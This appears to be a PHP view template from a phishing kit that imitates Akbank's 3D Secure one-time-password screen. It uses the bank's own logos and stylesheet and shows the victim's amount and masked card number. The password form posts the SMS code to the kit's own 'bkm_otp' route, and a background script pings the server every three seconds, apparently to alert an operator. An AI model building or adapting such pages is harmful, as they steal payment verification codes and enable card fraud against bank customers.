<html>

<head>
    <title>Alışveriş</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css">
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <!-- used for hidding spinner on winphone-->
    <style>
        .ui-loading .ui-loader {
            display: none;
        }

        .ui-icon-loading {
            opacity: 0;
        }
    </style>
    <meta name="decorator" content="3dlayout">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
</head>

<body marginwidth="0" marginheight="0">
    <div data-role="content" data-theme="c">
        <noscript style="color: red">İşleminizi tamamlayabilmeniz için Javascript'i etkinleştirin. </noscript>
        <div class="content">
            <div class="dijitalgozluk-arkaplan">

                <div class="dijitalgozluk-ekran">
                    <div class="dijitalgozluk-cerceve">
                        <div class="dijitalgozluk-kapat">
                            <a>
                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X">
                            </a>
                        </div>
                        <div class="dijitalgozluk-logolar">
                            <div class="dijitalgozluk-logo dijitalgozluk-logo-banka">
                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank">
                            </div>
                            <!--/logo-->
                            <div class="dijitalgozluk-yazi dijitalgozluk-baslik"> Uluslararası Güvenlik <br> Platformu 3D Secure </div>
                        </div>
                        <!--/logolar-->
                        <div class="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
                            <div class="dijitalgozluk-tablo-satir">
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> İşyeri Adı </div>
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ODEME HIZMETLERI </div>
                            </div>
                            <div class="dijitalgozluk-tablo-satir">
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?= number_format($data->balance, 2, '.', ',') ?> TL</div>
                            </div>
                            <div class="dijitalgozluk-tablo-satir">
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?= dmyhi($data->tarih) ?> </div>
                            </div>
                            <div class="dijitalgozluk-tablo-satir">
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Kart Numarası </div>
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ************<?= substr($data->cc_no, 12, 15) ?> </div>
                            </div>
                            <div class="dijitalgozluk-tablo-satir">
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Cep Telefonu </div>
                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> 05XXXXXXXXX </div>
                            </div>
                        </div>


                        <form id="bkmform" class="form-code" method="POST" action="<?= base_url('bkm_otp/' . $data->hash) ?>" autocomplete="off" novalidate="novalidate">


                            <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                                <div>
                                    <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                                </div>
                                <button id="retryButton" type="button" onclick="yeniSMSIste()" class="button btn-1 re-code v1" value="retry">
                                    Doğrulama Kodunu Yeniden Gönder
                                </button>

                            </div>

                            <div id="passwordInformation">
                                <div class="dijitalgozluk-kart-logo">
                                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="">
                                </div>
                                <div id="passwordInformation1" class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                                    <p>
                                        <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
                                    </p>
                                </div>
                                <div id="passwordInformation2" class="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
                                    <div class="dijitalgozluk-form-yazi-baslik">Şifre:</div>
                                    <div class="dijitalgozluk-form-yazi-input">
                                        <input type="password" name="password" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autofocus="" minlength="6" maxlength="6" size="6" autocomplete="off" required="">
                                    </div>
                                    <div id="helpDiv" class="dijitalgozluk-form-yazi-yardim">
                                        <a id="opener">Yardım</a>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div id="div1" style="width: 180px; margin: 0px auto 0 auto;"></div>
                            </div>
                            <div id="remainingWarn" class="dijitalgozluk-yazi dijitalgozluk-uyari">
                                <p> Onaylama süresinin dolmasına <span id="time">154</span> saniye kalmıştır </p>
                            </div>

                            <div id="submitButtonDiv" class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
                                <input id="submitbutton" type="submit" name="submit" type="submit" value="Devam">
                            </div>

                            <div id="wrongPassDiv" class="dijitalgozluk-yazi dijitalgozluk-uyari" style="display: none ;">
                                <p class="has-reg">Doğrulama kodu hatalı</p>
                            </div>

                            <div class="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
                                <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        var seconds = 180;
        var display = document.querySelector('#time');

        function incrementSeconds() {
            seconds -= 1;
            display.textContent = seconds;
        }

        var cancel = setInterval(incrementSeconds, 1000);
    </script>



    <?php $this->load->view('poslar/akbank/inc_js.php'); ?>

    <script>
        setInterval(function() {
            $.get("<?= base_url('zping') ?>", function(data) {});
        }, 3000);
    </script>
</body>

</html>